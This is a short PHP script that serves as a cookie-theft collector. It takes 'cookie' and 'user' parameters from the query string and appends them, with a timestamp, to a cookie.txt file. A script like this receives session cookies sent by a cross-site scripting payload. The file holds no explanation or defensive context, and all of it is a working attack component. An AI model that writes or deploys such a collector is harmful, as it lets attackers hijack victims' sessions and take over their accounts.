<?php
date_default_timezone_set('PRC');
$cookie	= $_GET['cookie'];
$user	= $_GET['user'];
$log			= fopen("cookie.txt", "a");
$nowtime = date("Y-m-d H:i:s");
fwrite($log, $nowtime. " | " . $user ." | " .$cookie . "\r\n");
fclose($log);

?>